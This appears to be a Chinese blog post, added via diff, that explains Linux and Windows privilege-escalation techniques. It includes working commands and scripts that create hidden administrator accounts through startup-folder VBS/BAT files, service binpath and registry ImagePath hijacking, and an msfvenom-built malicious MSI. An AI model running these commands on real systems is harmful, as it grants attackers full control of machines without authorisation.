@@ -1,0 +1,183 @@
+---
+layout: post
+title:  "网络安全－提权"
+categories: 网络安全
+tags: 网络安全 提权
+author: xueyp
+description: windows和linux常见提权手段
+---
+
+Linux提权
+============
+
+　　当渗透成功拥有一个shell后，由于获得的初始权限可能不高，可能会有一些拒绝执行指令的限制。为了获得目标主机的完整控制权限，需要在未授权的地方绕过权限控制。
+
+　　Metasploit 拥有各种使用不同技术的exploits尝试获取系统级权限。除此之外，这里还有一些在linux下使用的脚本。当尝试在目标机器上提升权限时可能会很有用。通常它们的目的是枚举系统信息而不是给出具体的vulnerabilities/exploits。这种类型的脚本将会节省很多提权时间。
+
+- **LinEnum**[下载](https://github.com/rebootuser/LinEnum)
+
+　　可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本
+
+　　隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。
+
+　　系统信息：主机名，网络详情，当前IP等等。
+
+　　用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。
+
+
+- **Linuxprivchecker**[下载](http://www.securitysift.com/download/linuxprivchecker.py)
+
+　　枚举系统设置和执行一些提升权限的检查。它由python实现，用来对被控制的系统提供建议的exploits。在终端中只需要使用 python linuxprivchecke.py 命令就可以使用，它将会枚举文件和目录的权限和内容。这个脚本和LinEnum工作方式一样,而且在关于系统网络和用户方面搜寻的很详细。
+
+- **Linux Exploit Suggester**[下载](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
+
+　　基于操作系统的内核版本号。执行“uname -r”来得到系统内核版本号。然后返回一个包含了可能exploits的列表。另外它还可以使用“-k”参数手工指定内核版本。不过有几年未更新过了。
+
+例如：
+
+```
+./Linux_Exploit_Suggester.pl -k 3.5
+```
+
+- **Unix-Privesc-checker**[下载](https://github.com/pentestmonkey/unix-privesc-check)
+
+　　在UNIX系统上检测权限提升向量的shell脚本。它可以在UNIX和Linux系统上运行。寻找那些错误的配置可以用来允许未授权用户提升对其他用户或者本地应用的权限。
+
+　　它被编写为单个shell脚本所以可以很容易上传和执行。它可以被普通用户或者root用户执行。当它发现一个组可写(group-writable)的文件或目录时，它只标记一个问题如果这个组包含了超过一个的非root成员。
+
+　　使用也很简单，例如：
+
+```
+unix-privesc-check detailed
+```
+
+Windows提权
+============
+- **信息**
+
+　　我们在拿到目标机器的后，需要先看下它的版本,远程端口等，下面列出了部门获取信息的命令
+```
+systeminfo | findstr OS  //获取系统版本信息
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  //获取远程端口
+wmic qfe get Caption,Description,HotFixID,InstalledOn  //获取系统打了哪些补丁
+set //获取环境变量
+```
+
+
+　　获取系统安装软件的信息
+
+```
+reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall reg.txt //导出注册表信息
+find "DisplayName" reg.txt |find /V "ParentDisplayName" > list.txt//找出注册表中的软件信息
+for /f "tokens=2,3 delims==/" %a in (tmplist.txt) do (echo %a >> softwarelist.txt)//将最终信息导出到softwarelist.txt
+```
+ 
+　　导出系统所有注册表
+
+```
+reg export HKLM hklm.reg
+reg export HKCU hkcu.reg
+reg export HKCU hkcr.reg
+reg export HKCU hku.reg
+reg export HKCU hkcc.reg
+```
+
+- **Trusted Service Paths**
+
+1 如果一个服务是以系统权限运行的，并且它的路径里面有空格，并且运行这个程序的时候文件路径没有完全包含在引号内，就有此漏洞。
+
+2 举个例子C:\Program Files\Elantech\ETDService.exe 这个是我电脑上的一个服务，首先windows会先找C:\Program.exe 文件再找C:\Program Files\Elantech\ETDService.exe 如果路径中空格较多，以此类推。
+
+3 想一下，如果我们在c:\下放一个Program.exe的木马文件，拿这个木马文件就是以系统权限运行的了（大部分情况下）。
+
+4 我们用msf生成一个木马文件，上传到c盘，然后关闭ETDService服务，再重启ETDService就可以，如果我们没有权限关闭这个服务，就只有等管理员重启这个服务。
+
+- **开机自启程序提权**
+
+1 在windows开机的时候会自动运行一些程序，如果我们能把恶意程序放在开机自启目录下，并且开机的时候是以高权限用户开启就能成功执行我们的恶意程序。
+
+2 下面是一段新建用户的vbs代码，将文件放在C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+```
+set wshshell=createobject ("wscript.shell")
+a=wshshell.run ("cmd.exe /c net user laowng laowang /add",0)
+b=wshshell.run ("cmd.exe /c net localgroup Administrators laowang /add",0)
+```
+ 
+　　其实这个用bat文件也可以，但是bat文件在开机的时候会弹一个小黑框，下面是bat文件的代码
+
+```
+@echo off
+net user xiao 123321 /add
+net localgroup administrators xiao /add
+```
+
+- **错误的权限配置**
+
+1 类似于开机自启动提权，有些程序会在开机时在后台运行，如果一个低权限的用户对对这些可执行文件所在的目录有写得权限，攻击者可以把这些可执行文件替换成恶意代码文件。
+
+2 我们可以手动测试步骤：
+
+　　accesschk64.exe -uwcqv “administrator” * /accepteula （下载地址）查看当前用户可以修改的服务（将administrator替换成Authenticated Users可以查看除了Guests用户以外所有用用户名、密码通过身份验证的账户能完全控制的服务）
+
+　　比如我们的服务的可执行文件是a.exe执行以下代码
+```
+sc config a binpath="net user test test /add"
+sc stop a
+sc start a
+sc config a binpath="net localgroup administrators test /add"
+sc stop a
+sc start a
+```
+
+　　这里binpath是指这个服务的可执行文件的路径，如果我们不能自己重启，当这个程序下次被管理员重启时我们任然能在目标设备上新建一个用户。
+
+- **注册表权限配置不当**
+
+1 与windows服务有关的信息存储在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services中，比如我的lsass存储在HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VaultSvc\ImagePath中，加入入侵者对这个注册表有修改的权限，他可以将这个值改成恶意程序的路径，这样这个程序就是以systen权限运行的。
+
+2 我们可以在目标机上上传一个subinacl.exe
+
+```
+subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\360FsFlt"/display
+```
+ 
+　　查看我们对这个注册表是否有修改权限，如果有我们就可以修改注册表
+
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\360FsFlt" /t REG_EXPAND_SZ /v ImagePath /d "C:\programdata\adduser.exe" /f
+```
+
+- **用户以system权限安装msi**
+
+1 在安装msi的时候，如果被攻击机开启了AlwaysInstallElevated设置，意味着即使我们是低权限用户，但是在安装msi的时候是以system权限去运行的。
+
+2 注册表查看AlwaysInstallElevated的值
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+ 
+　　如果这两个值都是1说明开启了AlwaysInstallElevated设置，这个时候我们就可以用msf生成一个msi木马
+
+3 msf生成恶意msi
+```
+msfvenom -p windows/adduser USER=test PASS=test -f msi-nouac -o haha.msi
+```
+
+4 命令行安装msi
+```
+msiexec /quiet /qn /i C:\programdata\haha.msi
+```
+
+- **计划任务**
+
+1 使用命令accesschk.exe -dqv "F:\tools" -accepteula 用户对这个目录的权限，加入找到一个该权限运行的目录并且低权限用户拥有写入权限，我们就可以用恶意程序替换掉原有程序。
+
+参考
+============
+[Windows提权的几种姿势](http://www.freebuf.com/vuls/87463.html)
+[Linux下三种提权方式](https://blog.csdn.net/yaofeino1/article/details/62897259)
+
+
+版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
